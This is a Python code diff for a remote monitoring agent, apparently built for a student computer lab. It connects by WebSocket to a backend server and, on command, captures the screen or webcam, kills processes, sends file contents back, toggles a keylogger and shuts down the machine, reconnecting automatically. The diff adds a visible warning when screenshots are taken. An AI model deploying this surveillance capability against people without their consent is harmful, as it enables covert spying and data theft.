@@ -3,6 +3,7 @@ import time
 import threading
 import base64
 import io
+import queue  # Thread-safe queue
 import websocket  # Thư viện kết nối WebSocket thuần
 
 # Thư viện phục vụ Webcam
@@ -13,11 +14,80 @@ from modules.system import get_process_list, kill_process_by_pid, execute_power_
 from modules.media import capture_screen_to_base64
 from modules.app_control import manage_application
 from modules.sandbox import get_sandbox_files, read_file_content
-# Import module keylogger mới tách lớp
-from modules.keylogger import start_keylogger_module, stop_keylogger_module
+# Import module cảnh báo màn hình nổi (Tkinter) - bọc try/except đề phòng lỗi
+try:
+    from modules.screen_notify import show_warning, hide_warning, update_warning_text, destroy as destroy_notify
+    SCREEN_NOTIFY_AVAILABLE = True
+    print("✅ Screen notify module loaded")
+except Exception as e:
+    print(f"⚠️ Screen notify không khả dụng: {e}")
+    SCREEN_NOTIFY_AVAILABLE = False
+    def show_warning(): pass
+    def hide_warning(): pass
+    def update_warning_text(text): pass
+    def destroy_notify(): pass
 
-MACHINE_NAME = 'Kali_Lab_01'
+# Import module keylogger - bọc try/except vì pynput cần môi trường desktop (X server)
+try:
+    from modules.keylogger import start_keylogger_module, stop_keylogger_module, configure_keylogger
+    KEYLOGGER_AVAILABLE = True
+except Exception as e:
+    print(f"⚠️ Keylogger không khả dụng (thiếu môi trường desktop): {e}")
+    KEYLOGGER_AVAILABLE = False
+    def configure_keylogger(*args, **kwargs): pass  # no-op fallback
+
+# Kali Linux only - Lay ten may tu hostname
+import socket
+MACHINE_NAME = socket.gethostname().replace(' ', '_')
+print(f"🖥️ Hệ điều hành: Kali Linux")
+print(f"🏷️ Tên máy: {MACHINE_NAME}")
+
 webcam_streaming = False
+
+# ============================================
+# 🔥 KIẾN TRÚC QUEUE: websocket-client KHÔNG thread-safe
+# TẤT CẢ các luồng (on_message, sys_monitor, webcam, keylogger)
+# đều phải enqueue message vào đây. Một luồng duy nhất (sender_thread)
+# sẽ lấy message ra và gửi qua WebSocket.
+# ============================================
+send_queue = queue.Queue()
+ws_ref = [None]  # Mutable container cho ws_client
+
+def sender_loop():
+    """Luồng duy nhất gửi dữ liệu qua WebSocket, tránh tuyệt đối race condition"""
+    while True:
+        try:
+            payload_dict = send_queue.get()  # Block cho đến khi có message
+            cmd = payload_dict.get('command', payload_dict.get('event', 'unknown'))
+            current_ws = ws_ref[0]
+            if current_ws is None:
+                print(f"⚠️ [SENDER] ws_ref[0] là None, bỏ qua message: {cmd}")
+                continue
+            try:
+                sock_ok = current_ws.sock is not None and current_ws.sock.connected
+                if sock_ok:
+                    payload_json = json.dumps(payload_dict)
+                    current_ws.send(payload_json)
+                    if cmd in ['agent_send_screen', 'agent_download_ready']:
+                        print(f"✅ [SENDER] Đã gửi thành công {cmd} ({len(payload_json)} bytes)")
+                else:
+                    print(f"⚠️ [SENDER] Socket không kết nối (sock={current_ws.sock is not None}), bỏ qua: {cmd}")
+            except (BrokenPipeError, ConnectionError, ConnectionResetError, OSError, AttributeError) as e:
+                print(f"⚠️ [SENDER] Lỗi gửi WebSocket (broken pipe/connection): {e}")
+            except Exception as e:
+                print(f"⚠️ [SENDER] Lỗi gửi WebSocket không xác định: {e}")
+        except Exception as e:
+            print(f"❌ [SENDER] Lỗi sender loop: {e}")
+            time.sleep(0.1)
+
+def enqueue_send(payload_dict):
+    """Thay thế safe_send: chỉ enqueue, không gửi trực tiếp"""
+    try:
+        send_queue.put_nowait(payload_dict)
+        return True
+    except Exception as e:
+        print(f"⚠️ Lỗi enqueue message: {e}")
+        return False
 
 
 def webcam_stream_worker(ws):
@@ -43,8 +113,7 @@ def webcam_stream_worker(ws):
                 "machine_name": MACHINE_NAME,
                 "image_base64": img_base64
             }
-            if ws.sock and ws.sock.connected:
-                ws.send(json.dumps(payload))
+            enqueue_send(payload)
         except Exception as e:
             print(f"❌ Lỗi truyền gói tin camera: {e}")
         time.sleep(0.25)
@@ -62,15 +131,21 @@ def on_message(ws, message):
 
         # 🎯 LUỒNG CHỤP MÀN HÌNH (SCREENSHOT & LIVE STREAM)
         if command == 'take_screenshot':
+            print(f"📸 [SCREENSHOT] Nhận lệnh chụp màn hình từ Backend!")
+            # Hiển thị cảnh báo nổi góc phải màn hình sinh viên
+            show_warning()
             base64_image = capture_screen_to_base64()
             if base64_image:
-                payload = {
+                print(f"📸 [SCREENSHOT] Chụp thành công! Kích thước ảnh base64: {len(base64_image)} bytes")
+                enqueue_send({
                     "command": "agent_send_screen",
                     "machine_name": MACHINE_NAME,
                     "image_base64": base64_image,
                     "is_static": True
-                }
-                ws.send(json.dumps(payload))
+                })
+                print(f"📸 [SCREENSHOT] Đã enqueue ảnh vào hàng đợi gửi đi.")
+            else:
+                print(f"❌ [SCREENSHOT] Chụp màn hình thất bại (capture_screen_to_base64 trả về None)")
             return
 
         # 🎯 LUỒNG QUẢN LÝ TIẾN TRÌNH (TASK MANAGER)
@@ -79,11 +154,11 @@ def on_message(ws, message):
             if pid:
                 pid = int(pid)
                 if kill_process_by_pid(pid):
-                    ws.send(json.dumps({
+                    enqueue_send({
                         "command": "agent_send_procs",
                         "machine_name": MACHINE_NAME,
                         "processes": get_process_list()
-                    }))
+                    })
             return
 
         # 🎯 LUỒNG ĐIỀU KHIỂN BẬT/TẮT ỨNG DỤNG WHITELIST
@@ -107,11 +182,11 @@ def on_message(ws, message):
         # 🎯 LUỒNG TRUY XUẤT DANH SÁCH TỆP TIN (FILE SANDBOX)
         elif command == 'list_directory':
             files = get_sandbox_files()
-            ws.send(json.dumps({
+            enqueue_send({
                 "command": "agent_send_files",
                 "machine_name": MACHINE_NAME,
                 "files": files
-            }))
+            })
             return
 
         # 🎯 LUỒNG TRÍCH XUẤT NỘI DUNG FILE ĐỂ TẢI VỀ WEB
@@ -119,22 +194,24 @@ def on_message(ws, message):
             file_title = data_args.get('file_name')
             file_payload = read_file_content(file_title)
             if file_payload:
-                ws.send(json.dumps({
+                enqueue_send({
                     "command": "agent_download_ready",
                     "machine_name": MACHINE_NAME,
                     "file_name": file_payload["file_name"],
                     "file_base64": file_payload["file_base64"]
-                }))
+                })
             return
 
         # 🎯 LUỒNG KIỂM SOÁT PHÍM BẤM THỰC HÀNH (KEYLOGGER DEMO CHUẨN ĐẠO ĐỨC)
         elif command == 'toggle_keylogger':
+            if not KEYLOGGER_AVAILABLE:
+                print("⚠️ Keylogger không khả dụng (thiếu môi trường desktop)")
+                enqueue_send({"command": "error", "message": "Keylogger không khả dụng trên máy này"})
+                return
             capturing = data_args.get('capturing', True)
             if capturing:
-                # Gọi hàm module kích hoạt bảng popup và bật listener
                 start_keylogger_module(ws, MACHINE_NAME)
             else:
-                # Gọi hàm module cưỡng bức dừng bắt phím và xóa popup
                 stop_keylogger_module()
             return
 
@@ -142,45 +219,79 @@ def on_message(ws, message):
         elif command in ['shutdown', 'restart']:
             execute_power_cmd(command.upper())
 
+    except json.JSONDecodeError as e:
+        print(f"❌ Lỗi phân tích JSON: {e}")
     except Exception as e:
-        print(f"❌ Lỗi xử lý hoặc phân tích bản tin JSON: {e}")
+        print(f"❌ Lỗi xử lý bản tin: {e}")
 
 
 def on_open(ws):
     print(f"✅ [CONNECTED] Đã thông nòng kết nối WebSocket tới FastAPI! Tên máy: {MACHINE_NAME}")
-    ws.send(json.dumps({"event": "agent_register", "machine_name": MACHINE_NAME}))
+    enqueue_send({"event": "agent_register", "machine_name": MACHINE_NAME})
 
 
 def on_close(ws, close_status_code, close_msg):
     global webcam_streaming
     print("❌ [DISCONNECTED] Mất kết nối tới Server Backend. Hủy toàn bộ luồng phụ.")
     webcam_streaming = False
-    stop_keylogger_module()
+    if KEYLOGGER_AVAILABLE:
+        stop_keylogger_module()
+    # Ẩn cảnh báo màn hình khi mất kết nối
+    hide_warning()
+    destroy_notify()
 
 
 if __name__ == '__main__':
-    BACKEND_WS_URL = f"ws://192.168.89.134:8000/ws/agent/{MACHINE_NAME}"
+    BACKEND_WS_URL = f"ws://192.168.1.2:8000/ws/agent/{MACHINE_NAME}"
 
-    ws_client = websocket.WebSocketApp(
-        BACKEND_WS_URL,
-        on_open=on_open,
-        on_message=on_message,
-        on_close=on_close
-    )
+    def create_ws_client():
+        """Tạo WebSocketApp mới và cập nhật ws_ref để các luồng khác dùng đúng instance"""
+        client = websocket.WebSocketApp(
+            BACKEND_WS_URL,
+            on_open=on_open,
+            on_message=on_message,
+            on_close=on_close
+        )
+        ws_ref[0] = client
+        return client
+
+    ws_client = create_ws_client()
+
+    # ============================================
+    # 🔥 Khởi chạy SENDER LOOP - luồng duy nhất ghi WebSocket
+    # ============================================
+    threading.Thread(target=sender_loop, name="ws-sender", daemon=True).start()
+
+    # Truyền tham chiếu enqueue_send và ws_ref cho keylogger module để thread-safe
+    if KEYLOGGER_AVAILABLE:
+        configure_keylogger(enqueue_send, ws_ref)
 
     # Luồng chạy ngầm độc lập gửi thông số Task Manager định kỳ (5 giây / lần)
     def sys_monitor_loop():
         while True:
             try:
-                if ws_client.sock and ws_client.sock.connected:
-                    ws_client.send(json.dumps({
+                current_ws = ws_ref[0]
+                if current_ws and current_ws.sock:
+                    enqueue_send({
                         "command": "agent_send_procs",
                         "machine_name": MACHINE_NAME,
                         "processes": get_process_list()
-                    }))
+                    })
             except Exception:
                 pass
             time.sleep(5)
 
-    threading.Thread(target=sys_monitor_loop, daemon=True).start()
-    ws_client.run_forever()
+    threading.Thread(target=sys_monitor_loop, name="sys-monitor", daemon=True).start()
+
+    # Vòng lặp kết nối có tự động reconnect khi mất kết nối
+    RECONNECT_DELAY = 5
+    while True:
+        try:
+            ws_client.run_forever()
+        except Exception as e:
+            print(f"⚠️ WebSocket run_forever lỗi: {e}")
+        print(f"🔄 Mất kết nối. Thử kết nối lại sau {RECONNECT_DELAY} giây...")
+        time.sleep(RECONNECT_DELAY)
+        # Tạo lại ws_client vì instance cũ đã đóng
+        ws_client = create_ws_client()
+        print(f"🔄 Đang kết nối lại tới {BACKEND_WS_URL}...")
